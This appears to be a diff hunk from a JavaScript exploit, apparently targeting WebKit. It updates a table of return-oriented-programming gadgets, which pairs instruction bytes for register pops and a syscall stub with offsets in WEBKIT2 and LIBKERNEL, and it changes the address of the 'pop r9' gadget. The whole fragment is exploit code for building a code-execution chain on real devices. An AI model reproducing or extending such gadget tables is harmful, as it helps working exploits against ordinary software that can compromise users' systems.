@@ -8,7 +8,7 @@ var gadgets = {
     "pop rsi": new gadget([0x5e], WEBKIT2, 0x2a3925),
     "pop rdi": new gadget([0x5f], WEBKIT2, 0x1a7fcb),
     "pop r8": new gadget([0x41, 0x58], WEBKIT2, 0xb82cd),
-    "pop r9": new gadget([0x43, 0x59], WEBKIT2, 0x3bef4f),
+    "pop r9": new gadget([0x43, 0x59], WEBKIT2, 0x1D914A4),
     "pop rsp": new gadget([0xf3, 0x5c], WEBKIT2, 0x5fb25),
     
     "mov r10, rcx; syscall": new gadget([0x49, 0x89, 0xca, 0x0f, 0x05], LIBKERNEL, 0x457),
